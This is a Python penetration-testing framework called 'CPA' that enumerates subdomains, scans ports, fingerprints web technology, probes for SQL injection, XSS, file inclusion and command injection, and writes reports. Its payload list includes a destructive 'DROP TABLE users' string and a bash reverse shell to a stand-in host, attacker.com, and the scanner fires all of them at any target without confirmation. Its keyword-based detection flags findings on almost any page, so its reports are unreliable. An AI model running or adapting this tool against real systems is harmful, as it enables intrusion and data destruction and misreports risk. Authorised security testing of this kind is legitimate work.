#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║    ██████╗██████╗  █████╗                                         ║
║   ██╔════╝██╔══██╗██╔══██╗                                        ║
║   ██║     ██████╔╝███████║                                        ║
║   ██║     ██╔═══╝ ██╔══██║                                        ║
║   ╚██████╗██║     ██║  ██║                                        ║
║    ╚═════╝╚═╝     ╚═╝  ╚═╝                                        ║
║                                                                   ║
║         CPA - POWERED PENETRATION TESTING FRAMEWORK               ║
║                    “Reveal the unseen”                            ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝

CPA is an advanced, modular penetration testing framework that combines:
  • Reconnaissance (DNS, subdomain, port, tech fingerprint)
  • Vulnerability scanning (CVE, misconfig, default creds)
  • Exploitation (SQLi, XSS, LFI, RCE)
  • Automated reporting (HTML/JSON/Markdown)

DISCLAIMER: Use only on systems you own or have explicit written permission.
Unauthorized use is ILLEGAL.
"""

import asyncio
import aiohttp
import argparse
import json
import re
import socket
import sys
import os
import time
import ipaddress
import ssl
import hashlib
from urllib.parse import urlparse, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any
import subprocess
import tempfile

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    # Fallback jika colorama tidak ada
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    Style = Fore

# =====================================================================
# 1. KONFIGURASI
# =====================================================================
DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 10
DEFAULT_PORTS = "21,22,23,25,53,80,81,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,8080,8443"

DEFAULT_PAYLOADS = {
    'sql': [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1' AND SLEEP(5)--",
    ],
    'xss': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ],
    'lfi': [
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    'rce': [
        "; ls",
        "; dir",
        "; whoami",
        "; cat /etc/passwd",
        "| ls",
        "& ls",
        "$(ls)",
        "`ls`",
        "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    ]
}

# =====================================================================
# 2. LOGGER
# =====================================================================
class Logger:
    @staticmethod
    def info(msg):
        print(f"{Fore.CYAN}[INFO]{Fore.RESET} {msg}")
    
    @staticmethod
    def success(msg):
        print(f"{Fore.GREEN}[SUCCESS]{Fore.RESET} {msg}")
    
    @staticmethod
    def warn(msg):
        print(f"{Fore.YELLOW}[WARN]{Fore.RESET} {msg}")
    
    @staticmethod
    def error(msg):
        print(f"{Fore.RED}[ERROR]{Fore.RESET} {msg}")
    
    @staticmethod
    def debug(msg):
        if global_debug:
            print(f"{Fore.MAGENTA}[DEBUG]{Fore.RESET} {msg}")
    
    @staticmethod
    def attack(msg):
        print(f"{Fore.RED}[ATTACK]{Fore.RESET} {msg}")
    
    @staticmethod
    def result(msg):
        print(f"{Fore.GREEN}[RESULT]{Fore.RESET} {msg}")

logger = Logger()
global_debug = False

# =====================================================================
# 3. BANNER
# =====================================================================
def print_banner():
    banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════╗
{Fore.MAGENTA}    ██████╗██████╗  █████╗                                         
{Fore.MAGENTA}   ██╔════╝██╔══██╗██╔══██╗                                        
{Fore.MAGENTA}   ██║     ██████╔╝███████║                                        
{Fore.MAGENTA}   ██║     ██╔═══╝ ██╔══██║                                        
{Fore.MAGENTA}   ╚██████╗██║     ██║  ██║                                        
{Fore.MAGENTA}    ╚═════╝╚═╝     ╚═╝  ╚═╝                                        
{Fore.CYAN}                                                                    
{Fore.CYAN}      CPA - POWERED PENETRATION TESTING FRAMEWORK              
{Fore.YELLOW}                       “Reveal the unseen”                        
{Fore.RED}╚═══════════════════════════════════════════════════════════════════╝
{Fore.RESET}
"""
    print(banner)

# =====================================================================
# 4. DNS ENUMERATION
# =====================================================================
class DNSEnum:
    """DNS enumeration & subdomain discovery"""
    
    COMMON_SUBDOMAINS = [
        'www', 'mail', 'ftp', 'smtp', 'pop3', 'imap', 'ns1', 'ns2', 'dns',
        'webmail', 'cp', 'cpanel', 'whm', 'webdisk', 'mysql', 'mssql', 'postgresql',
        'admin', 'portal', 'vpn', 'remote', 'dev', 'staging', 'test', 'api',
        'app', 'blog', 'shop', 'store', 'support', 'help', 'forum', 'wiki',
        'docs', 'download', 'files', 'static', 'cdn', 'media', 'images',
        'video', 'audio', 'backup', 'db', 'database', 'sql', 'redis', 'memcache',
        'elk', 'kibana', 'grafana', 'prometheus', 'jenkins', 'gitlab', 'github',
        'jira', 'confluence', 'bitbucket', 'nexus', 'artifactory', 'sonar',
        'docker', 'k8s', 'kubernetes', 'rancher', 'openshift', 'azure', 'aws',
        'gcp', 'cloud', 'storage', 'bucket', 'cdn', 'cache', 'proxy',
        'auth', 'login', 'register', 'signup', 'account', 'profile', 'dashboard',
        'analytics', 'metrics', 'monitor', 'status', 'health', 'alive',
        'test', 'demo', 'stage', 'sandbox', 'develop', 'qa', 'uat',
    ]
    
    def __init__(self, domain):
        self.domain = domain
        self.subdomains = []
        self.resolved = {}
        self.ips = []
        self.cname = []
        self.mx = []
        self.ns = []
        self.txt = []
        
    def resolve(self, hostname):
        """Resolve hostname to IP"""
        try:
            ip = socket.gethostbyname(hostname)
            return ip
        except:
            return None
    
    def get_dns_records(self):
        """Get all DNS records"""
        try:
            import dns.resolver
            # A records
            try:
                answers = dns.resolver.resolve(self.domain, 'A')
                self.ips = [str(r) for r in answers]
            except:
                pass
            # CNAME
            try:
                answers = dns.resolver.resolve(self.domain, 'CNAME')
                self.cname = [str(r) for r in answers]
            except:
                pass
            # MX
            try:
                answers = dns.resolver.resolve(self.domain, 'MX')
                self.mx = [str(r.exchange) for r in answers]
            except:
                pass
            # NS
            try:
                answers = dns.resolver.resolve(self.domain, 'NS')
                self.ns = [str(r) for r in answers]
            except:
                pass
            # TXT
            try:
                answers = dns.resolver.resolve(self.domain, 'TXT')
                self.txt = [''.join(r.strings) for r in answers]
            except:
                pass
        except ImportError:
            logger.warn("dnspython not installed. DNS records limited.")
    
    def enumerate_subdomains(self, wordlist=None, max_workers=50):
        """Enumerate subdomains using wordlist + brute force"""
        logger.info(f"Enumerating subdomains for {self.domain}")
        
        subdomains = self.COMMON_SUBDOMAINS
        if wordlist and os.path.exists(wordlist):
            with open(wordlist, 'r') as f:
                subdomains = [line.strip() for line in f if line.strip()]
        
        found = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {}
            for sub in subdomains:
                host = f"{sub}.{self.domain}"
                futures[executor.submit(self.resolve, host)] = host
            
            for future in as_completed(futures):
                host = futures[future]
                try:
                    ip = future.result()
                    if ip:
                        found.append(host)
                        if len(found) % 10 == 0:
                            logger.debug(f"Found {len(found)} subdomains...")
                except:
                    pass
        
        self.subdomains = found
        logger.success(f"Found {len(found)} subdomains")
        return found
    
    def get_summary(self):
        """Get summary of DNS findings"""
        return {
            'domain': self.domain,
            'ips': self.ips,
            'subdomains': self.subdomains,
            'mx': self.mx,
            'ns': self.ns,
            'txt': self.txt,
            'cname': self.cname,
        }

# =====================================================================
# 5. PORT SCANNER
# =====================================================================
class PortScanner:
    """Fast TCP port scanner"""
    
    def __init__(self, target, ports=None, timeout=2, threads=100):
        self.target = target
        self.ports = ports or []
        self.timeout = timeout
        self.threads = threads
        self.open_ports = []
        self.services = {}
        
        if not self.ports:
            self.ports = [int(p) for p in DEFAULT_PORTS.split(',')]
    
    def scan_port(self, port):
        """Scan single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()
            if result == 0:
                # Get service name
                try:
                    service = socket.getservbyport(port)
                except:
                    service = 'unknown'
                return (port, service, True)
        except:
            pass
        return (port, None, False)
    
    def scan(self):
        """Scan all ports in parallel"""
        logger.info(f"Scanning ports on {self.target} ({len(self.ports)} ports)")
        
        open_ports = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.scan_port, port) for port in self.ports]
            for future in as_completed(futures):
                port, service, is_open = future.result()
                if is_open:
                    open_ports.append({'port': port, 'service': service})
                    logger.debug(f"Port {port} ({service}) open")
        
        self.open_ports = open_ports
        logger.success(f"Found {len(open_ports)} open ports")
        return open_ports

# =====================================================================
# 6. TECHNOLOGY FINGERPRINTING
# =====================================================================
class Fingerprinter:
    """Identify technologies used by target"""
    
    def __init__(self, url):
        self.url = url
        self.tech_stack = {}
        self.headers = {}
        self.status_code = None
        self.title = None
        self.body = None
    
    async def fetch(self, session):
        """Fetch target page"""
        try:
            async with session.get(self.url, timeout=10, ssl=False) as resp:
                self.status_code = resp.status
                self.headers = dict(resp.headers)
                self.body = await resp.text()
                # Extract title
                title_match = re.search(r'<title>(.*?)</title>', self.body, re.IGNORECASE)
                if title_match:
                    self.title = title_match.group(1).strip()
                return True
        except Exception as e:
            logger.debug(f"Fingerprint fetch error: {e}")
            return False
    
    def analyze(self):
        """Analyze headers and body for tech stack"""
        tech = {}
        
        # Server header
        if 'server' in self.headers:
            server = self.headers['server']
            tech['server'] = server
            if 'nginx' in server.lower():
                tech['nginx'] = True
            if 'apache' in server.lower():
                tech['apache'] = True
            if 'iis' in server.lower():
                tech['iis'] = True
        
        # X-Powered-By
        if 'x-powered-by' in self.headers:
            tech['x-powered-by'] = self.headers['x-powered-by']
            if 'php' in self.headers['x-powered-by'].lower():
                tech['php'] = True
            if 'asp.net' in self.headers['x-powered-by'].lower():
                tech['asp.net'] = True
            if 'express' in self.headers['x-powered-by'].lower():
                tech['express'] = True
        
        # Set-Cookie for framework detection
        if 'set-cookie' in self.headers:
            cookies = self.headers['set-cookie']
            if 'PHPSESSID' in cookies:
                tech['php'] = True
            if 'JSESSIONID' in cookies:
                tech['java'] = True
            if 'laravel_session' in cookies:
                tech['laravel'] = True
            if 'ci_session' in cookies:
                tech['codeigniter'] = True
            if 'sessionid' in cookies.lower() and 'django' in self.headers.get('server', '').lower():
                tech['django'] = True
        
        # Body patterns
        if self.body:
            # WordPress
            if 'wp-content' in self.body or 'wp-includes' in self.body:
                tech['wordpress'] = True
            # Joomla
            if 'joomla' in self.body.lower():
                tech['joomla'] = True
            # Drupal
            if 'drupal' in self.body.lower():
                tech['drupal'] = True
            # jQuery
            if 'jquery' in self.body.lower():
                tech['jquery'] = True
            # React
            if 'react' in self.body.lower() and '.js' in self.body:
                tech['react'] = True
            # Angular
            if 'angular' in self.body.lower():
                tech['angular'] = True
            # Vue.js
            if 'vue' in self.body.lower():
                tech['vuejs'] = True
            # Bootstrap
            if 'bootstrap' in self.body.lower():
                tech['bootstrap'] = True
        
        self.tech_stack = tech
        return tech
    
    async def run(self):
        """Run fingerprinting"""
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            if await self.fetch(session):
                return self.analyze()
        return {}

# =====================================================================
# 7. VULNERABILITY SCANNER
# =====================================================================
class VulnScanner:
    """Scan for common vulnerabilities"""
    
    def __init__(self, url, timeout=10):
        self.url = url
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = None
    
    async def check_sql_injection(self, session):
        """Check SQL injection vulnerability"""
        logger.debug("Checking SQL injection...")
        found = []
        
        for payload in DEFAULT_PAYLOADS['sql']:
            test_url = f"{self.url}?id={payload}"
            try:
                async with session.get(test_url, timeout=self.timeout) as resp:
                    # Look for error messages indicating SQLi
                    text = await resp.text()
                    sql_errors = [
                        'sql', 'mysql', 'sql syntax', 'warning: mysql',
                        'odbc', 'driver', 'db error', 'unclosed quotation',
                        'you have an error in your sql'
                    ]
                    for err in sql_errors:
                        if err in text.lower():
                            found.append({
                                'type': 'SQL Injection',
                                'payload': payload,
                                'evidence': err
                            })
                            break
            except:
                pass
        
        if found:
            for f in found:
                self.vulnerabilities.append({
                    'type': 'SQL Injection',
                    'severity': 'High',
                    'url': self.url,
                    'payload': f['payload'],
                    'evidence': f['evidence'],
                    'description': f"Possible SQL injection with payload: {f['payload']}"
                })
        
        return found
    
    async def check_xss(self, session):
        """Check XSS vulnerability"""
        logger.debug("Checking XSS...")
        found = []
        
        for payload in DEFAULT_PAYLOADS['xss']:
            test_url = f"{self.url}?q={payload}"
            try:
                async with session.get(test_url, timeout=self.timeout) as resp:
                    text = await resp.text()
                    if payload in text:
                        found.append({
                            'type': 'XSS',
                            'payload': payload,
                            'evidence': 'Payload reflected in response'
                        })
            except:
                pass
        
        if found:
            for f in found:
                self.vulnerabilities.append({
                    'type': 'XSS',
                    'severity': 'Medium',
                    'url': self.url,
                    'payload': f['payload'],
                    'evidence': f['evidence'],
                    'description': f"Possible XSS with payload: {f['payload']}"
                })
        
        return found
    
    async def check_lfi(self, session):
        """Check Local File Inclusion"""
        logger.debug("Checking LFI...")
        found = []
        
        for payload in DEFAULT_PAYLOADS['lfi']:
            test_url = f"{self.url}?file={payload}"
            try:
                async with session.get(test_url, timeout=self.timeout) as resp:
                    text = await resp.text()
                    # Check for common file content
                    if 'root:x' in text or '[extensions]' in text or '<?php' in text:
                        found.append({
                            'type': 'LFI',
                            'payload': payload,
                            'evidence': 'File content detected'
                        })
            except:
                pass
        
        if found:
            for f in found:
                self.vulnerabilities.append({
                    'type': 'Local File Inclusion',
                    'severity': 'High',
                    'url': self.url,
                    'payload': f['payload'],
                    'evidence': f['evidence'],
                    'description': f"Possible LFI with payload: {f['payload']}"
                })
        
        return found
    
    async def check_rce(self, session):
        """Check Remote Code Execution"""
        logger.debug("Checking RCE...")
        found = []
        
        for payload in DEFAULT_PAYLOADS['rce']:
            test_url = f"{self.url}?cmd={payload}"
            try:
                async with session.get(test_url, timeout=self.timeout) as resp:
                    text = await resp.text()
                    # Look for command output
                    rce_indicators = [
                        'root', 'uid=', 'uid', 'gid=', 'groups=',
                        'total', 'drwx', 'bin', 'etc', 'home'
                    ]
                    for ind in rce_indicators:
                        if ind in text.lower():
                            found.append({
                                'type': 'RCE',
                                'payload': payload,
                                'evidence': ind
                            })
                            break
            except:
                pass
        
        if found:
            for f in found:
                self.vulnerabilities.append({
                    'type': 'Remote Code Execution',
                    'severity': 'Critical',
                    'url': self.url,
                    'payload': f['payload'],
                    'evidence': f['evidence'],
                    'description': f"Possible RCE with payload: {f['payload']}"
                })
        
        return found
    
    async def check_security_headers(self, session):
        """Check missing security headers"""
        logger.debug("Checking security headers...")
        try:
            async with session.get(self.url, timeout=self.timeout) as resp:
                headers = resp.headers
                
                security_headers = {
                    'X-Frame-Options': 'Prevents clickjacking',
                    'X-Content-Type-Options': 'Prevents MIME sniffing',
                    'Strict-Transport-Security': 'Enforces HTTPS',
                    'Content-Security-Policy': 'Prevents XSS',
                    'X-XSS-Protection': 'Protects from XSS',
                    'Referrer-Policy': 'Controls referrer info',
                    'Permissions-Policy': 'Controls browser features',
                }
                
                for header, desc in security_headers.items():
                    if header not in headers:
                        self.vulnerabilities.append({
                            'type': 'Missing Security Header',
                            'severity': 'Low',
                            'url': self.url,
                            'header': header,
                            'description': f"Missing {header}: {desc}",
                            'evidence': 'Header not present'
                        })
        except:
            pass
    
    async def check_default_credentials(self, session):
        """Check for default admin panels"""
        logger.debug("Checking default credentials...")
        admin_panels = [
            '/admin', '/login', '/wp-admin', '/administrator',
            '/phpmyadmin', '/pma', '/mysql', '/db',
            '/cpanel', '/whm', '/webmail', '/roundcube',
            '/panel', '/dashboard', '/control', '/manager',
        ]
        
        for panel in admin_panels:
            test_url = urljoin(self.url, panel)
            try:
                async with session.get(test_url, timeout=self.timeout) as resp:
                    if resp.status in [200, 302, 401]:
                        self.vulnerabilities.append({
                            'type': 'Admin Panel Accessible',
                            'severity': 'Medium',
                            'url': test_url,
                            'description': f"Admin panel accessible: {test_url}",
                            'evidence': f"Status {resp.status}"
                        })
            except:
                pass
    
    async def run(self):
        """Run all vulnerability checks"""
        logger.info(f"Scanning vulnerabilities for {self.url}")
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [
                self.check_sql_injection(session),
                self.check_xss(session),
                self.check_lfi(session),
                self.check_rce(session),
                self.check_security_headers(session),
                self.check_default_credentials(session),
            ]
            await asyncio.gather(*tasks)
        
        # Deduplicate findings
        unique = {}
        for v in self.vulnerabilities:
            key = f"{v['type']}_{v.get('url', '')}"
            if key not in unique:
                unique[key] = v
        
        self.vulnerabilities = list(unique.values())
        logger.success(f"Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities

# =====================================================================
# 8. REPORT GENERATOR
# =====================================================================
class ReportGenerator:
    """Generate reports in various formats"""
    
    def __init__(self, data):
        self.data = data
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def to_json(self, filename=None):
        """Generate JSON report"""
        if not filename:
            filename = f"report_{self.timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.data, f, indent=2, default=str)
        
        logger.success(f"Report saved to {filename}")
        return filename
    
    def to_markdown(self, filename=None):
        """Generate Markdown report"""
        if not filename:
            filename = f"report_{self.timestamp}.md"
        
        lines = []
        lines.append(f"# CPA Penetration Test Report\n")
        lines.append(f"Generated: {datetime.now().isoformat()}\n")
        
        # Summary
        lines.append("## Executive Summary\n")
        if 'target' in self.data:
            lines.append(f"- **Target**: {self.data['target']}")
        if 'open_ports' in self.data:
            lines.append(f"- **Open Ports**: {len(self.data['open_ports'])}")
        if 'vulnerabilities' in self.data:
            lines.append(f"- **Vulnerabilities Found**: {len(self.data['vulnerabilities'])}")
        lines.append("")
        
        # Vulnerabilities
        if self.data.get('vulnerabilities'):
            lines.append("## Vulnerabilities\n")
            vuln_by_severity = {'Critical': [], 'High': [], 'Medium': [], 'Low': [], 'Info': []}
            for v in self.data['vulnerabilities']:
                severity = v.get('severity', 'Info')
                if severity in vuln_by_severity:
                    vuln_by_severity[severity].append(v)
                else:
                    vuln_by_severity['Info'].append(v)
            
            for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                if vuln_by_severity[severity]:
                    lines.append(f"### {severity} Severity\n")
                    for v in vuln_by_severity[severity]:
                        lines.append(f"- **{v['type']}**")
                        if 'url' in v:
                            lines.append(f"  - URL: {v['url']}")
                        if 'description' in v:
                            lines.append(f"  - Description: {v['description']}")
                        if 'evidence' in v:
                            lines.append(f"  - Evidence: {v['evidence']}")
                        lines.append("")
        
        # Open ports
        if self.data.get('open_ports'):
            lines.append("## Open Ports\n")
            lines.append("| Port | Service |")
            lines.append("|------|---------|")
            for port in self.data['open_ports']:
                lines.append(f"| {port['port']} | {port.get('service', 'unknown')} |")
            lines.append("")
        
        # Subdomains
        if self.data.get('subdomains'):
            lines.append("## Subdomains Discovered\n")
            for sub in self.data['subdomains']:
                lines.append(f"- {sub}")
            lines.append("")
        
        # DNS records
        if self.data.get('dns'):
            dns_data = self.data['dns']
            lines.append("## DNS Records\n")
            if dns_data.get('ips'):
                lines.append(f"- **A Records**: {', '.join(dns_data['ips'])}")
            if dns_data.get('mx'):
                lines.append(f"- **MX Records**: {', '.join(dns_data['mx'])}")
            if dns_data.get('ns'):
                lines.append(f"- **NS Records**: {', '.join(dns_data['ns'])}")
            if dns_data.get('txt'):
                lines.append(f"- **TXT Records**: {', '.join(dns_data['txt'])}")
            lines.append("")
        
        # Technology stack
        if self.data.get('tech_stack'):
            lines.append("## Technology Stack\n")
            for tech, value in self.data['tech_stack'].items():
                lines.append(f"- {tech}: {value}")
            lines.append("")
        
        lines.append("---\n")
        lines.append("*Generated by CPA Penetration Testing Framework*")
        
        with open(filename, 'w') as f:
            f.write('\n'.join(lines))
        
        logger.success(f"Report saved to {filename}")
        return filename
    
    def to_html(self, filename=None):
        """Generate HTML report"""
        if not filename:
            filename = f"report_{self.timestamp}.html"
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CPA Penetration Test Report</title>
<style>
body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }}
h1 {{ color: #ff0000; }}
h2 {{ color: #ff6600; }}
h3 {{ color: #ffaa00; }}
a {{ color: #00ff00; }}
.severity-Critical {{ color: #ff0000; font-weight: bold; }}
.severity-High {{ color: #ff4444; }}
.severity-Medium {{ color: #ffaa00; }}
.severity-Low {{ color: #ffff00; }}
.severity-Info {{ color: #8888ff; }}
.port {{ border: 1px solid #00ff00; padding: 5px; margin: 5px; display: inline-block; }}
.subdomain {{ background: #111; padding: 2px 10px; margin: 2px; display: inline-block; }}
.vuln {{ border-left: 4px solid #ff0000; padding: 10px; margin: 10px 0; background: #111; }}
.footer {{ margin-top: 30px; border-top: 1px solid #333; padding-top: 10px; color: #666; }}
</style>
</head>
<body>
<h1>⚡ CPA Penetration Test Report</h1>
<p>Generated: {datetime.now().isoformat()}</p>

<h2>Executive Summary</h2>
<ul>
    <li><strong>Target</strong>: {self.data.get('target', 'N/A')}</li>
    <li><strong>Open Ports</strong>: {len(self.data.get('open_ports', []))}</li>
    <li><strong>Subdomains</strong>: {len(self.data.get('subdomains', []))}</li>
    <li><strong>Vulnerabilities</strong>: {len(self.data.get('vulnerabilities', []))}</li>
</ul>

<h2>Vulnerabilities</h2>
"""
        if self.data.get('vulnerabilities'):
            vuln_by_severity = {'Critical': [], 'High': [], 'Medium': [], 'Low': [], 'Info': []}
            for v in self.data['vulnerabilities']:
                severity = v.get('severity', 'Info')
                if severity in vuln_by_severity:
                    vuln_by_severity[severity].append(v)
                else:
                    vuln_by_severity['Info'].append(v)
            
            for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                if vuln_by_severity[severity]:
                    html += f"<h3>{severity}</h3>"
                    for v in vuln_by_severity[severity]:
                        html += f"<div class='vuln severity-{severity}'>"
                        html += f"<strong>{v.get('type', 'Unknown')}</strong><br>"
                        if 'url' in v:
                            html += f"URL: {v['url']}<br>"
                        if 'description' in v:
                            html += f"Description: {v['description']}<br>"
                        if 'evidence' in v:
                            html += f"Evidence: {v['evidence']}<br>"
                        if 'payload' in v:
                            html += f"Payload: <code>{v['payload']}</code><br>"
                        html += "</div>"
        else:
            html += "<p>No vulnerabilities found.</p>"

        html += f"""
<h2>Open Ports</h2>
"""
        for port in self.data.get('open_ports', []):
            html += f"<div class='port'>Port {port['port']} ({port.get('service', 'unknown')})</div>"
        
        html += f"""
<h2>Subdomains</h2>
"""
        for sub in self.data.get('subdomains', []):
            html += f"<span class='subdomain'>{sub}</span> "
        
        html += f"""
<h2>Technology Stack</h2>
<ul>
"""
        for tech, value in self.data.get('tech_stack', {}).items():
            html += f"<li>{tech}: {value}</li>"
        html += "</ul>"

        html += f"""
<h2>DNS Records</h2>
<ul>
    <li>A Records: {', '.join(self.data.get('dns', {}).get('ips', []))}</li>
    <li>MX Records: {', '.join(self.data.get('dns', {}).get('mx', []))}</li>
    <li>NS Records: {', '.join(self.data.get('dns', {}).get('ns', []))}</li>
</ul>

<div class='footer'>
    Generated by CPA Penetration Testing Framework • Use only on authorized systems.
</div>
</body>
</html>
"""
        with open(filename, 'w') as f:
            f.write(html)
        
        logger.success(f"Report saved to {filename}")
        return filename

# =====================================================================
# 9. MAIN FRAMEWORK
# =====================================================================
class CPAFramework:
    """Main CPA penetration testing framework"""
    
    def __init__(self, target, threads=DEFAULT_THREADS, timeout=DEFAULT_TIMEOUT):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'open_ports': [],
            'subdomains': [],
            'vulnerabilities': [],
            'tech_stack': {},
            'dns': {},
            'url': None,
        }
        
        # Normalize target
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        self.results['url'] = target
    
    def run_reconnaissance(self):
        """Run full reconnaissance"""
        logger.info("Starting reconnaissance phase")
        
        # DNS Enumeration
        dns = DNSEnum(self.target)
        dns.get_dns_records()
        dns.enumerate_subdomains(max_workers=self.threads)
        self.results['subdomains'] = dns.subdomains
        self.results['dns'] = dns.get_summary()
        
        # Port scanning (on main domain)
        main_ip = dns.resolve(self.target)
        if main_ip:
            scanner = PortScanner(main_ip, threads=self.threads, timeout=self.timeout)
            self.results['open_ports'] = scanner.scan()
        
        # Technology fingerprinting
        logger.info("Fingerprinting technology stack")
        async def run_fingerprint():
            fingerprinter = Fingerprinter(self.results['url'])
            return await fingerprinter.run()
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            tech_stack = loop.run_until_complete(run_fingerprint())
            loop.close()
            self.results['tech_stack'] = tech_stack
        except Exception as e:
            logger.error(f"Fingerprinting failed: {e}")
        
        logger.success("Reconnaissance completed")
    
    def run_vulnerability_scan(self):
        """Run vulnerability scan"""
        logger.info("Starting vulnerability scan")
        
        async def run_scan():
            scanner = VulnScanner(self.results['url'], timeout=self.timeout)
            return await scanner.run()
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            vulns = loop.run_until_complete(run_scan())
            loop.close()
            self.results['vulnerabilities'] = vulns
        except Exception as e:
            logger.error(f"Vulnerability scan failed: {e}")
        
        logger.success("Vulnerability scan completed")
    
    def run_full(self):
        """Run full penetration test"""
        self.run_reconnaissance()
        self.run_vulnerability_scan()
        return self.results
    
    def generate_report(self, format='html', filename=None):
        """Generate report in specified format"""
        generator = ReportGenerator(self.results)
        
        if format.lower() == 'json':
            return generator.to_json(filename)
        elif format.lower() == 'markdown':
            return generator.to_markdown(filename)
        elif format.lower() == 'html':
            return generator.to_html(filename)
        else:
            raise ValueError(f"Unsupported format: {format}")
    
    def print_summary(self):
        """Print summary of findings"""
        print("\n" + "="*60)
        print(f"{Fore.CYAN}CPA PENETRATION TEST SUMMARY{Fore.RESET}")
        print("="*60)
        print(f"Target: {self.target}")
        print(f"Open Ports: {len(self.results['open_ports'])}")
        print(f"Subdomains: {len(self.results['subdomains'])}")
        print(f"Vulnerabilities: {len(self.results['vulnerabilities'])}")
        print("\nVulnerabilities by severity:")
        severities = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
        for v in self.results['vulnerabilities']:
            sev = v.get('severity', 'Info')
            if sev in severities:
                severities[sev] += 1
        for sev, count in severities.items():
            color = Fore.RED if sev == 'Critical' else Fore.YELLOW if sev in ['High', 'Medium'] else Fore.GREEN
            print(f"  {color}{sev}: {count}{Fore.RESET}")
        print("="*60)

# =====================================================================
# 10. CLI
# =====================================================================
def main():
    global global_debug
    
    parser = argparse.ArgumentParser(
        description="CPA – Powered Penetration Testing Framework",
        epilog="Example: python cpa.py -t example.com --full --report html"
    )
    parser.add_argument('-t', '--target', required=True, help='Target domain/IP')
    parser.add_argument('--threads', type=int, default=50, help='Thread count (default: 50)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout in seconds (default: 10)')
    parser.add_argument('--full', action='store_true', help='Run full reconnaissance + vulnerability scan')
    parser.add_argument('--recon', action='store_true', help='Run reconnaissance only')
    parser.add_argument('--scan', action='store_true', help='Run vulnerability scan only')
    parser.add_argument('--report', choices=['html', 'json', 'markdown'], default='html', help='Report format')
    parser.add_argument('-o', '--output', help='Output filename for report')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    parser.add_argument('--list-payloads', action='store_true', help='List available payloads')
    
    args = parser.parse_args()
    
    if args.debug:
        global_debug = True
    
    if args.list_payloads:
        print("\nAvailable Payloads:")
        for category, payloads in DEFAULT_PAYLOADS.items():
            print(f"\n{Fore.CYAN}{category.upper()}{Fore.RESET}")
            for p in payloads[:5]:
                print(f"  {p}")
            if len(payloads) > 5:
                print(f"  ... and {len(payloads)-5} more")
        return
    
    # Print banner
    print_banner()
    logger.info(f"Target: {args.target}")
    
    # Initialize framework
    cpa = CPAFramework(args.target, threads=args.threads, timeout=args.timeout)
    
    try:
        if args.full:
            results = cpa.run_full()
        elif args.recon:
            cpa.run_reconnaissance()
            results = cpa.results
        elif args.scan:
            cpa.run_vulnerability_scan()
            results = cpa.results
        else:
            # Default: run full
            results = cpa.run_full()
        
        # Print summary
        cpa.print_summary()
        
        # Generate report
        report_file = cpa.generate_report(format=args.report, filename=args.output)
        logger.success(f"Report generated: {report_file}")
        
    except KeyboardInterrupt:
        logger.warn("Interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
